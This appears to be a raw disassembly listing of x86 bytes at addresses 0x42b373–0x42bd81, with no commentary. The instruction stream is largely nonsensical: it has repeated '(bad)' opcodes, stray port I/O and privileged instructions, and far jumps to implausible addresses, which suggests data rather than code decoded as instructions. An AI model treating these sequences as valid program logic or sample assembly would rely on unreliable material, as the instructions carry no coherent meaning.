  42b373:	lahf   
  42b374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b375:	add    al,0x5
  42b377:	ret    
  42b378:	inc    esi
  42b379:	xchg   esi,eax
  42b37a:	or     cl,BYTE PTR [di]
  42b37d:	dec    edi
  42b37e:	imul   esi,DWORD PTR [ebx],0x2f6ce027
  42b384:	mov    ds:0x1a4e614e,eax
  42b389:	loopne 0x42b3ea
  42b38b:	pusha  
  42b38c:	popa   
  42b38d:	mov    ebp,0x97408aed
  42b392:	add    edi,DWORD PTR [ebp+esi*8+0x4]
  42b396:	hlt    
  42b397:	push   cs
  42b398:	pop    edi
  42b399:	mov    cl,0x26
  42b39b:	stc    
  42b39c:	jbe    0x42b3d3
  42b39e:	stc    
  42b39f:	jmp    0x42b40b
  42b3a1:	sub    dl,0xd2
  42b3a4:	lods   eax,DWORD PTR ds:[esi]
  42b3a5:	xchg   DWORD PTR cs:[edi-0x7c],edi
  42b3a9:	lods   al,BYTE PTR ds:[esi]
  42b3aa:	cli    
  42b3ab:	sub    eax,0x41eef29a
  42b3b0:	or     edx,edx
  42b3b2:	scas   al,BYTE PTR es:[edi]
  42b3b3:	and    BYTE PTR [ebp+ebx*2-0x59],ch
  42b3b7:	mov    eax,ds:0xe63111e4
  42b3bc:	xor    esp,DWORD PTR ds:0xb906b1dd
  42b3c2:	ja     0x42b435
  42b3c4:	in     al,dx
  42b3c5:	js     0x42b3b5
  42b3c7:	repnz inc edx
  42b3c9:	stos   DWORD PTR es:[edi],eax
  42b3ca:	cwde   
  42b3cb:	in     al,0xf4
  42b3cd:	idiv   BYTE PTR [ebx]
  42b3cf:	mov    ds:0xb16a4a10,al
  42b3d4:	jecxz  0x42b41f
  42b3d6:	adc    DWORD PTR [esi-0xf],ebx
  42b3d9:	ins    DWORD PTR es:[edi],dx
  42b3da:	cmp    ebp,DWORD PTR [esp+eiz*2-0x342d8e3]
  42b3e1:	jbe    0x42b42c
  42b3e3:	stos   DWORD PTR es:[edi],eax
  42b3e4:	aaa    
  42b3e5:	sub    al,0x7c
  42b3e7:	cmp    eax,0x2a3e098c
  42b3ec:	jo     0x42b39b
  42b3ee:	cmp    DWORD PTR [edx-0x2063ca73],0x6d998e8b
  42b3f8:	jo     0x42b429
  42b3fa:	or     cl,cl
  42b3fc:	sbb    ecx,DWORD PTR [eax-0xac67013]
  42b402:	pop    esi
  42b403:	es pop es
  42b405:	cmp    esi,DWORD PTR [eax]
  42b407:	mov    ds:0x1ba8ddc6,eax
  42b40c:	cmc    
  42b40d:	sbb    DWORD PTR [edx],edx
  42b40f:	add    DWORD PTR [eax],eax
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [esi+0x42],esp
  42b482:	add    ecx,DWORD PTR [ecx-0x40]
  42b485:	into   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    al,0x1
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	ins    BYTE PTR es:[edi],dx
  42b48d:	aaa    
  42b48e:	adc    BYTE PTR [ebp-0x5f22b046],cl
  42b494:	(bad)
  42b498:	adc    esp,edi
  42b49a:	out    dx,al
  42b49b:	test   eax,0x441eb7b0
  42b4a0:	inc    ecx
  42b4a1:	mov    esi,0x715345ad
  42b4a6:	xchg   edx,eax
  42b4a7:	fwait
  42b4a8:	pop    ebp
  42b4a9:	xor    eax,0xd8af6532
  42b4ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4af:	lahf   
  42b4b0:	sub    ch,BYTE PTR ds:0xe03ba4ab
  42b4b6:	fadd   QWORD PTR [ebx]
  42b4b8:	mov    ds:0x66e665f9,al
  42b4bd:	ins    BYTE PTR es:[edi],dx
  42b4be:	out    dx,al
  42b4bf:	adc    eax,0x4db1bb63
  42b4c4:	push   ss
  42b4c5:	iret   
  42b4c6:	enter  0xb2f8,0xcd
  42b4ca:	in     eax,dx
  42b4cb:	loopne 0x42b493
  42b4cd:	cli    
  42b4ce:	or     al,0xbb
  42b4d0:	test   BYTE PTR [ebp-0xdb106f6],cl
  42b4d6:	sub    DWORD PTR [esp+ebx*1+0x59],ebx
  42b4da:	imul   esp,edx,0x18f073f9
  42b4e0:	in     al,dx
  42b4e1:	or     al,0x2
  42b4e3:	cdq    
  42b4e4:	sub    eax,edx
  42b4e6:	pop    esi
  42b4e7:	xchg   edx,eax
  42b4e8:	mov    al,0x94
  42b4ea:	push   0xffffffd8
  42b4ec:	mov    bh,0xca
  42b4ee:	cmp    al,0x87
  42b4f0:	xor    DWORD PTR [eax],eax
  42b4f2:	jmp    0xf480:0x88752ae5
  42b4f9:	loop   0x42b52e
  42b4fb:	loop   0x42b516
  42b4fd:	ror    BYTE PTR ds:0xef0c4572,1
  42b503:	fmul   DWORD PTR [edx+0x23]
  42b506:	xchg   ebx,eax
  42b507:	sub    eax,0x82c8c999
  42b50c:	lea    edx,[ebp-0x79a919c4]
  42b512:	aaa    
  42b513:	in     eax,dx
  42b514:	xor    eax,0xddaf0fa2
  42b519:	jmp    0x42b54f
  42b51b:	sbb    bl,dh
  42b51d:	rol    DWORD PTR [eax],1
  42b51f:	mov    ch,0x77
  42b521:	daa    
  42b522:	add    DWORD PTR [edi],ecx
  42b524:	hlt    
  42b525:	out    0x5c,eax
  42b527:	cwde   
  42b528:	dec    esp
  42b529:	loop   0x42b4dc
  42b52b:	fucomip st,st(1)
  42b52d:	ficomp DWORD PTR [ecx+0xfaa637f]
  42b533:	mov    ds:0x7e9f5a2d,eax
  42b538:	(bad)  
  42b53a:	mov    dh,bh
  42b53c:	iret   
  42b53d:	xchg   edx,eax
  42b53e:	dec    edx
  42b53f:	jmp    0xdcb377a5
  42b544:	mov    bh,0x98
  42b546:	pop    ebx
  42b547:	push   cs
  42b548:	add    esp,edi
  42b54a:	stos   BYTE PTR es:[edi],al
  42b54b:	fcomp  DWORD PTR [edi]
  42b54d:	mov    gs,WORD PTR [edx-0x3f]
  42b550:	pop    ebx
  42b551:	and    al,0xa5
  42b553:	lock xchg DWORD PTR [esi-0x5fcdb01c],edx
  42b55a:	jnp    0x42b4f2
  42b55c:	lods   eax,DWORD PTR ds:[esi]
  42b55d:	ret    0x62bf
  42b560:	and    eax,0xd986b216
  42b565:	add    edx,DWORD PTR [edi+0x44]
  42b568:	jge    0x42b586
  42b56a:	inc    eax
  42b56b:	cdq    
  42b56c:	pop    ecx
  42b56d:	inc    edx
  42b56e:	dec    BYTE PTR [edx]
  42b570:	or     DWORD PTR [edx-0x47d4c277],esp
  42b576:	cmp    eax,0x24d47616
  42b57b:	sbb    edi,DWORD PTR ds:0xf41f48c
  42b581:	dec    ebx
  42b582:	mov    ch,0x54
  42b584:	jle    0x42b584
  42b586:	sahf   
  42b587:	jno    0x42b5bb
  42b589:	fisttp WORD PTR [ecx-0x38256694]
  42b58f:	sbb    eax,DWORD PTR [eax]
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	xchg   DWORD PTR [ecx-0x303b55aa],edx
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    al,0x1
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	in     al,dx
  42b60d:	mov    bl,bl
  42b60f:	fldcw  WORD PTR [eax+0xb4606d9]
  42b615:	mov    gs,ecx
  42b617:	add    DWORD PTR [ebx+0x4d120966],0x88af7ea5
  42b621:	jo     0x42b662
  42b623:	in     eax,0x4f
  42b625:	inc    ecx
  42b626:	sub    eax,0x8f1edad9
  42b62b:	cs aas 
  42b62d:	repnz in eax,0x4d
  42b630:	and    eax,0xe45df117
  42b635:	adc    ecx,ebx
  42b637:	pop    ecx
  42b638:	loop   0x42b61f
  42b63a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b63b:	cs pop edi
  42b63d:	xor    DWORD PTR ds:0x123834fb,esi
  42b643:	sahf   
  42b644:	jb     0x42b63c
  42b646:	mov    esi,0x1cf7e216
  42b64b:	outs   dx,BYTE PTR ds:[esi]
  42b64c:	mov    ah,0x8c
  42b64e:	or     BYTE PTR [edi],dl
  42b650:	sbb    edi,DWORD PTR [esp+edi*4]
  42b653:	jle    0x42b5f3
  42b655:	push   esi
  42b656:	(bad)  
  42b657:	push   ebx
  42b658:	in     al,dx
  42b659:	mov    eax,0x9254a187
  42b65e:	fisubr DWORD PTR [esi-0x1138fcfc]
  42b664:	adc    BYTE PTR [ecx-0x2f0d2eb],ah
  42b66a:	xor    dh,dl
  42b66c:	adc    DWORD PTR [esi],ebp
  42b66e:	xlat   BYTE PTR ds:[ebx]
  42b66f:	call   DWORD PTR [eax+eiz*1+0xa]
  42b673:	repz xor ebp,eax
  42b676:	jne    0x42b633
  42b678:	mov    ?,edi
  42b67a:	mov    ah,0xf3
  42b67c:	int3   
  42b67d:	jne    0x42b663
  42b67f:	retw   0x6942
  42b683:	push   ds
  42b684:	(bad)  
  42b685:	fcmovnbe st,st(7)
  42b687:	cdq    
  42b688:	in     eax,dx
  42b689:	pop    ss
  42b68a:	mov    esi,0x9a0b5b04
  42b68f:	adc    DWORD PTR [esi+0x54],eax
  42b692:	iret   
  42b693:	mov    cl,0x6f
  42b695:	out    dx,eax
  42b696:	and    DWORD PTR [edi],0xffffff80
  42b699:	test   eax,0xba6400c6
  42b69e:	adc    bl,bh
  42b6a0:	icebp  
  42b6a1:	jl     0x42b69f
  42b6a3:	jb     0x42b6eb
  42b6a5:	or     ch,BYTE PTR [edx-0x75]
  42b6a8:	out    dx,al
  42b6a9:	mov    ch,0xef
  42b6ab:	jecxz  0x42b697
  42b6ad:	xchg   DWORD PTR [edi],eax
  42b6af:	mov    ds:0x4e49196f,al
  42b6b4:	repnz loopne 0x42b63a
  42b6b7:	imul   esi,DWORD PTR [ebp+0x1f],0x5d
  42b6bb:	dec    ebp
  42b6bc:	push   ss
  42b6bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b6be:	or     ebp,DWORD PTR [eax+0x7af2c65f]
  42b6c4:	aam    0xf6
  42b6c6:	and    BYTE PTR [edi-0xc],al
  42b6c9:	push   0xc85fec61
  42b6ce:	les    ecx,FWORD PTR [edi]
  42b6d0:	popa   
  42b6d1:	jl     0x42b71f
  42b6d3:	cdq    
  42b6d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6d5:	mov    ebx,0x99efaa2f
  42b6da:	push   0x30
  42b6dc:	lds    esp,FWORD PTR [eax+0x4]
  42b6df:	xlat   BYTE PTR ds:[ebx]
  42b6e0:	jl     0x42b735
  42b6e2:	and    DWORD PTR [ebx+eiz*1],edx
  42b6e5:	fist   DWORD PTR [edx-0x6d6e1fae]
  42b6eb:	fs jb  0x42b6f9
  42b6ee:	popa   
  42b6ef:	(bad)  
  42b6f0:	leave  
  42b6f1:	push   eax
  42b6f2:	imul   esp,DWORD PTR [eax+0x4a],0xffffffe4
  42b6f6:	bound  ebp,QWORD PTR [ebx+esi*1+0x46a0ec36]
  42b6fd:	mov    ah,0xea
  42b6ff:	jns    0x42b755
  42b701:	jl     0x42b742
  42b703:	mov    edi,0x506f7337
  42b708:	dec    ebp
  42b709:	in     al,dx
  42b70a:	(bad)  
  42b70c:	pop    ebx
  42b70d:	je     0x42b6f7
  42b70f:	mov    WORD PTR [eax],es
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	mov    al,0x2a
  42b782:	out    0xe8,eax
  42b784:	enter  0x1d0,0x0
  42b788:	add    al,0x1
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	ins    DWORD PTR es:[edi],dx
  42b78d:	scas   eax,DWORD PTR es:[edi]
  42b78e:	cmc    
  42b78f:	jl     0x42b752
  42b791:	mov    ah,0x91
  42b793:	aam    0x34
  42b795:	ret    
  42b796:	sub    BYTE PTR [ecx-0x1644e49a],dh
  42b79c:	push   edi
  42b79d:	jb     0x42b74b
  42b79f:	stos   DWORD PTR es:[edi],eax
  42b7a0:	pop    ebx
  42b7a1:	ficom  WORD PTR [esi+0xf56af49]
  42b7a7:	mov    al,ds:0x22ec476
  42b7ac:	repz push esi
  42b7ae:	push   esi
  42b7af:	outs   dx,BYTE PTR ds:[esi]
  42b7b0:	push   0x98b8f9c5
  42b7b5:	or     esp,DWORD PTR [edi+0x191440a8]
  42b7bb:	rol    cl,1
  42b7bd:	jecxz  0x42b7fc
  42b7bf:	test   al,0x8e
  42b7c1:	(bad)  
  42b7c2:	loopne 0x42b83e
  42b7c4:	idiv   BYTE PTR es:[eax*8-0x3a95cb01]
  42b7cc:	jb     0x42b7a8
  42b7ce:	sbb    BYTE PTR [ebx-0x29009588],dl
  42b7d4:	and    al,0x31
  42b7d6:	inc    eax
  42b7d7:	cmc    
  42b7d8:	out    0x9e,eax
  42b7da:	push   0xffffff94
  42b7dc:	mov    esi,0xa9e858a0
  42b7e1:	mov    ds:0x6a91d747,al
  42b7e6:	out    0x94,eax
  42b7e8:	and    eax,0xd7460b19
  42b7ed:	fsubr  st,st(0)
  42b7ef:	xchg   DWORD PTR [esi+0x3c],edi
  42b7f2:	xor    al,0x2e
  42b7f4:	(bad)  
  42b7f5:	jne    0x42b863
  42b7f7:	mov    esp,0x8081a800
  42b7fd:	lock xlat BYTE PTR ds:[ebx]
  42b7ff:	(bad)  [edx+ebx*8+0x14]
  42b803:	cmc    
  42b804:	add    eax,0x3414a6e9
  42b809:	test   BYTE PTR [esi],ah
  42b80b:	push   ds
  42b80c:	gs xchg esi,esp
  42b80f:	cmp    eax,DWORD PTR [esi+0x74]
  42b812:	mov    dl,0x8b
  42b814:	cmp    ebp,DWORD PTR [edi+0x27c4a3cd]
  42b81a:	xor    bh,BYTE PTR [ebx+0xe27a498]
  42b820:	inc    eax
  42b821:	retf   
  42b822:	xor    al,0x25
  42b824:	push   0x46
  42b826:	mov    edx,0x3f7ae6aa
  42b82b:	out    0x4f,eax
  42b82d:	out    0xd8,eax
  42b82f:	addr16 (bad) 
  42b832:	lahf   
  42b833:	mov    eax,0xdf68e5f5
  42b838:	mov    WORD PTR [ebp+0x49],ds
  42b83b:	inc    eax
  42b83c:	bound  eax,QWORD PTR [ebx-0x33c977ff]
  42b842:	shl    bh,0xac
  42b845:	mov    esp,0xe8f49df4
  42b84a:	add    ch,al
  42b84c:	mov    eax,ds:0x2534d9d2
  42b851:	adc    ch,BYTE PTR [ebx]
  42b853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b854:	leave  
  42b855:	adc    ch,BYTE PTR [ecx-0x67]
  42b858:	xor    eax,0x290300
  42b85d:	das    
  42b85e:	or     al,0x97
  42b860:	out    0xb0,eax
  42b862:	mov    ecx,0xc0a23ba4
  42b867:	and    ebx,DWORD PTR [esi-0x3d]
  42b86a:	out    0x6d,al
  42b86c:	dec    esp
  42b86d:	jns    0x42b8c0
  42b86f:	fimul  WORD PTR [ecx-0x42]
  42b872:	aaa    
  42b873:	dec    ebp
  42b874:	mov    DWORD PTR [esi+ebx*1-0xd278c47],esi
  42b87b:	sbb    bh,BYTE PTR [esi+0x6b]
  42b87e:	scas   eax,DWORD PTR es:[edi]
  42b87f:	pop    ds
  42b880:	addr16 push 0x22578323
  42b886:	and    eax,0xe18f8e99
  42b88b:	jo     0x42b8ff
  42b88d:	div    DWORD PTR [ebp+0xa5]
	...
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     esi,DWORD PTR [ecx-0x6f]
  42b902:	mov    eax,ds:0x1d1ccea
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	fstp   TBYTE PTR [eax]
  42b90e:	sbb    DWORD PTR [ecx-0x1283d216],eax
  42b914:	jmp    0x595e:0x12d78f58
  42b91b:	sub    al,0xc2
  42b91d:	pop    ss
  42b91e:	mov    esi,0x877c6199
  42b923:	xor    eax,0x89b669b3
  42b928:	fbld   TBYTE PTR [eax]
  42b92a:	push   edx
  42b92b:	ja     0x42b99e
  42b92d:	push   cs
  42b92e:	data16 das 
  42b930:	imul   esi,DWORD PTR [ebx-0x4dbd0288],0x10
  42b937:	loope  0x42b955
  42b939:	push   ds
  42b93a:	mov    edx,0xc4c381d0
  42b93f:	or     esi,esi
  42b941:	sbb    al,0x84
  42b943:	mov    bh,dl
  42b945:	or     eax,0xed941423
  42b94a:	cmp    eax,0x2695d33
  42b94f:	dec    esp
  42b950:	mov    dh,0x9f
  42b952:	sub    eax,0x92e71511
  42b957:	inc    edi
  42b958:	cli    
  42b959:	jns    0x42b90d
  42b95b:	sar    DWORD PTR [edx],1
  42b95d:	aaa    
  42b95e:	in     eax,0x80
  42b960:	ja     0x42b902
  42b962:	ins    DWORD PTR es:[edi],dx
  42b963:	shl    BYTE PTR [eax+edi*8],cl
  42b966:	daa    
  42b967:	xchg   edi,eax
  42b968:	in     eax,dx
  42b969:	loopne 0x42b92d
  42b96b:	(bad)  
  42b96c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b96d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42b96f:	ret    0xdd67
  42b972:	out    dx,eax
  42b973:	sbb    DWORD PTR [edx],0x6c
  42b976:	ja     0x42b990
  42b978:	xor    DWORD PTR [eax-0x31a466ea],ebp
  42b97e:	in     eax,dx
  42b97f:	inc    eax
  42b980:	sub    ebp,DWORD PTR [ecx+0x65]
  42b983:	pushw  es
  42b985:	fdivrp st(0),st
  42b987:	jnp    0x42b93d
  42b989:	pop    es
  42b98a:	iret   
  42b98b:	jg     0x42b955
  42b98d:	pop    ebx
  42b98e:	mov    ebx,0x22aaba24
  42b993:	jmp    0xd7bb9330
  42b998:	ficomp DWORD PTR ds:0xaa458238
  42b99e:	js     0x42ba04
  42b9a0:	lods   eax,DWORD PTR ds:[esi]
  42b9a1:	push   edx
  42b9a2:	arpl   WORD PTR [edi-0x221e5dd1],sp
  42b9a8:	retf   0x8d3d
  42b9ab:	push   edi
  42b9ac:	add    eax,0x116e0d2b
  42b9b1:	xchg   ebp,eax
  42b9b2:	and    BYTE PTR [ebx],dl
  42b9b4:	mov    eax,ds:0x8d96dbf7
  42b9b9:	aaa    
  42b9ba:	dec    ch
  42b9bc:	jle    0x42ba06
  42b9be:	push   es
  42b9bf:	retf   
  42b9c0:	adc    al,0xa0
  42b9c2:	xor    bl,BYTE PTR [esi-0x6e]
  42b9c5:	imul   edx,DWORD PTR [ebp-0x7e9eff9d],0xffffffb7
  42b9cc:	mov    esi,0xc1fdd755
  42b9d1:	and    DWORD PTR [ecx],esi
  42b9d3:	mov    ebp,0x34e33e5d
  42b9d8:	xchg   esi,eax
  42b9d9:	dec    edx
  42b9da:	mov    ah,0xcb
  42b9dc:	inc    ebx
  42b9dd:	push   es
  42b9de:	pushf  
  42b9df:	outs   dx,DWORD PTR fs:[esi]
  42b9e1:	in     eax,dx
  42b9e2:	test   al,0x58
  42b9e4:	or     esp,DWORD PTR [esi-0xb]
  42b9e7:	out    dx,al
  42b9e8:	cli    
  42b9e9:	out    0x99,eax
  42b9eb:	mov    esp,0xae42d6d8
  42b9f0:	in     eax,0x3a
  42b9f2:	pop    edx
  42b9f3:	xor    al,0x29
  42b9f5:	cwde   
  42b9f6:	add    DWORD PTR ds:0x6a37e447,eax
  42b9fc:	aaa    
  42b9fd:	mov    esp,0x7c035501
  42ba02:	dec    ebx
  42ba03:	push   ss
  42ba04:	das    
  42ba05:	add    BYTE PTR [edi+ecx*1],bh
  42ba08:	aad    0x58
  42ba0a:	(bad)  
  42ba0b:	jmp    0x42ba8c
  42ba0d:	cdq    
  42ba0e:	pop    esp
  42ba0f:	sahf   
	...
  42ba74:	mov    eax,DWORD PTR [edi]
  42ba76:	mov    al,0xe2
  42ba78:	mov    esp,0x6a6fdbf7
  42ba7d:	pop    ebx
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [ecx-0x6f],ebx
  42ba82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ba83:	pusha  
  42ba84:	rcl    dl,1
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    al,0x1
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	and    BYTE PTR [ebx+0x4e89f03c],dh
  42ba92:	sahf   
  42ba93:	aaa    
  42ba94:	in     al,0x34
  42ba96:	jmp    0x59f0ccda
  42ba9b:	mov    gs,WORD PTR [eax]
  42ba9d:	push   ebp
  42ba9e:	fdivr  st,st(2)
  42baa0:	mov    ecx,0x3854a7e1
  42baa5:	test   BYTE PTR [eax+0x4f9e5ab1],cl
  42baab:	fisub  WORD PTR [esp+ebx*8]
  42baae:	icebp  
  42baaf:	or     al,0x47
  42bab1:	and    ecx,DWORD PTR [ebp+0x34]
  42bab4:	bound  esi,QWORD PTR [edi+0x5d]
  42bab7:	jecxz  0x42ba93
  42bab9:	shl    BYTE PTR [eax+esi*2],1
  42babc:	mov    WORD PTR [esi+0x3e69f06f],es
  42bac2:	xchg   BYTE PTR [esi],bl
  42bac4:	scas   al,BYTE PTR es:[edi]
  42bac5:	fild   WORD PTR [ecx+0x2f5b26ed]
  42bacb:	pop    ebp
  42bacc:	push   edi
  42bacd:	sbb    eax,0xf3a30eb4
  42bad2:	dec    ebx
  42bad3:	mov    ds:0xb3a561f6,eax
  42bad8:	in     al,0xbd
  42bada:	loope  0x42baea
  42badc:	sub    ebx,DWORD PTR [esi+0x4487098d]
  42bae2:	pop    eax
  42bae3:	je     0x42bb54
  42bae5:	jo     0x42babc
  42bae7:	jmp    0x350af677
  42baec:	cmp    DWORD PTR ds:0xa85347a8,0x48ad01a7
  42baf6:	stc    
  42baf7:	and    al,0x77
  42baf9:	inc    ebp
  42bafa:	adc    bl,bh
  42bafc:	popf   
  42bafd:	adc    ebp,DWORD PTR [edi+eax*4+0x65c2ab32]
  42bb04:	in     eax,0x9e
  42bb06:	call   0xe92591a1
  42bb0b:	ret    
  42bb0c:	arpl   WORD PTR [ecx],bp
  42bb0e:	mov    edx,esp
  42bb10:	mov    ebx,0x2abd8bf0
  42bb15:	in     eax,dx
  42bb16:	push   esp
  42bb17:	xchg   ebp,eax
  42bb18:	mov    ds:0xcb9c58af,eax
  42bb1d:	add    ch,BYTE PTR [ecx-0x76]
  42bb20:	imul   DWORD PTR [edx]
  42bb22:	xor    al,BYTE PTR [edi+0x7c]
  42bb25:	push   ds
  42bb26:	ins    BYTE PTR es:[edi],dx
  42bb27:	out    dx,al
  42bb28:	in     al,0xe
  42bb2a:	cwde   
  42bb2b:	and    eax,0x460884a9
  42bb30:	or     DWORD PTR [edx],edi
  42bb32:	call   0xfec32849
  42bb37:	mov    dh,BYTE PTR [esi]
  42bb39:	sbb    BYTE PTR [ebp+0x651f3c0c],0x87
  42bb40:	shl    dh,1
  42bb42:	in     al,0x2b
  42bb44:	xor    DWORD PTR [edx+0x58b9a451],esp
  42bb4a:	stos   BYTE PTR es:[edi],al
  42bb4b:	les    eax,FWORD PTR [ebp-0x1]
  42bb4e:	mov    ebx,0x1c9b5339
  42bb53:	jne    0x42bb40
  42bb55:	inc    ebp
  42bb56:	aaa    
  42bb57:	sbb    al,0xb4
  42bb59:	cmp    ebx,DWORD PTR [edi+0x22]
  42bb5c:	in     al,0xb2
  42bb5e:	mov    bh,0x4c
  42bb60:	lea    edx,cs:[ebp-0x5258798b]
  42bb67:	(bad)  
  42bb68:	fcmovnu st,st(5)
  42bb6a:	jmp    0x42bb7f
  42bb6c:	out    0xb5,eax
  42bb6e:	jmp    0x42bbb0
  42bb70:	les    edx,FWORD PTR [eax-0x39a2f315]
  42bb76:	xchg   BYTE PTR [ebx],dh
  42bb78:	push   es
  42bb79:	cs out dx,eax
  42bb7b:	or     al,0xf8
  42bb7d:	mov    ebx,0x748eb170
  42bb82:	jmp    0xc0afc26
  42bb87:	sub    DWORD PTR [eax-0x32eac],edi
  42bb8d:	xor    al,0xd1
  42bb8f:	and    BYTE PTR [eax],al
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	lods   al,BYTE PTR ds:[esi]
  42bc01:	fwait
  42bc02:	pop    esp
  42bc03:	push   ecx
  42bc04:	aam    0xd3
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    al,0x1
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	pop    edi
  42bc0d:	push   ecx
  42bc0e:	inc    ecx
  42bc0f:	sub    edi,DWORD PTR [ecx-0x49324635]
  42bc15:	mov    edx,0xe83b6eb8
  42bc1a:	(bad)  
  42bc1b:	cmp    DWORD PTR [edi+0x2],0x7f5444ff
  42bc22:	(bad)  
  42bc23:	fdivr  st,st(6)
  42bc25:	xchg   edx,eax
  42bc26:	xor    eax,0xc62805b1
  42bc2b:	dec    ebx
  42bc2c:	mov    esi,0x1a74249c
  42bc31:	dec    ebp
  42bc32:	cwde   
  42bc33:	aam    0xe9
  42bc35:	ds inc ebx
  42bc37:	xor    edx,DWORD PTR ds:0xcfdcaba1
  42bc3d:	ins    DWORD PTR es:[edi],dx
  42bc3e:	add    dh,bh
  42bc40:	cmp    ebx,DWORD PTR [eax]
  42bc42:	xor    bh,0x46
  42bc45:	mov    dh,0x82
  42bc47:	cli    
  42bc48:	adc    edi,edx
  42bc4a:	dec    ecx
  42bc4b:	mov    dh,0x91
  42bc4d:	jg     0x42bbda
  42bc4f:	sub    DWORD PTR [eax],esi
  42bc51:	jmp    0x101f:0x2e75b37a
  42bc58:	lods   eax,DWORD PTR ds:[esi]
  42bc59:	jb     0x42bc11
  42bc5b:	push   eax
  42bc5c:	mov    edi,ss
  42bc5e:	xor    ebp,DWORD PTR [edi+0xf309a7]
  42bc64:	(bad)  
  42bc65:	xor    al,0x0
  42bc67:	mov    edi,DWORD PTR [eax+0x5b87fb60]
  42bc6d:	mov    al,bl
  42bc6f:	mov    dh,0x18
  42bc71:	jmp    DWORD PTR [edi+0x4c]
  42bc74:	fwait
  42bc75:	sbb    ah,BYTE PTR [ecx]
  42bc77:	xchg   esi,eax
  42bc78:	cmp    bh,BYTE PTR [esi]
  42bc7a:	and    BYTE PTR [edi-0x4f],ch
  42bc7d:	push   ebx
  42bc7e:	mov    esi,0x9fc2cdb0
  42bc83:	in     eax,0xd9
  42bc85:	and    BYTE PTR [esi],0xe8
  42bc88:	mov    esp,0x9ec6254d
  42bc8d:	add    edi,eax
  42bc8f:	or     al,0x86
  42bc91:	stos   BYTE PTR es:[edi],al
  42bc92:	repnz jecxz 0x42bc5e
  42bc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc96:	cmp    cl,BYTE PTR [eax+0x40]
  42bc99:	xor    esi,DWORD PTR [eax-0x44]
  42bc9c:	pusha  
  42bc9d:	aas    
  42bc9e:	xchg   ecx,eax
  42bc9f:	mov    ds:0xfdb47a60,al
  42bca4:	aam    0x6c
  42bca6:	adc    DWORD PTR [edi],edi
  42bca8:	pop    esp
  42bca9:	imul   eax,ecx,0x19
  42bcac:	and    esi,ebx
  42bcae:	cmp    al,0x31
  42bcb0:	mov    dl,0xfa
  42bcb2:	mov    ebp,0xa1dc926c
  42bcb7:	(bad)  
  42bcb8:	hlt    
  42bcb9:	fs js  0x42bd30
  42bcbc:	int    0x33
  42bcbe:	popf   
  42bcbf:	inc    eax
  42bcc0:	mov    ebp,0x5637c7c
  42bcc5:	imul   DWORD PTR [esi+0x2a]
  42bcc8:	aad    0xd6
  42bcca:	cmp    eax,0x9b6e5378
  42bccf:	ret    
  42bcd0:	push   esi
  42bcd1:	mov    ds:0xf56af733,al
  42bcd6:	fwait
  42bcd7:	xor    al,ch
  42bcd9:	jno    0x42bc5d
  42bcdb:	push   edi
  42bcdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bcdd:	lods   eax,DWORD PTR ds:[esi]
  42bcde:	es (bad) 
  42bce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bce1:	mov    bl,0x40
  42bce3:	daa    
  42bce4:	cmp    DWORD PTR [ecx+0x26daa9d6],eax
  42bcea:	addr16 fadd st,st(7)
  42bced:	and    eax,0x312f3670
  42bcf2:	shr    BYTE PTR [esi-0x604f8b37],1
  42bcf8:	jp     0x42bd21
  42bcfa:	cli    
  42bcfb:	mov    edi,0x20ee83bc
  42bd00:	mov    dl,0xdc
  42bd02:	cmp    al,0xf4
  42bd04:	mov    ch,0x36
  42bd06:	xchg   edx,eax
  42bd07:	cmp    DWORD PTR [esp+eiz*4],esi
  42bd0a:	push   es
  42bd0b:	sbb    BYTE PTR [esi+0x1e],bl
  42bd0e:	jp     0x42bc90
	...
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd9e
  42bd81:	out    dx,eax
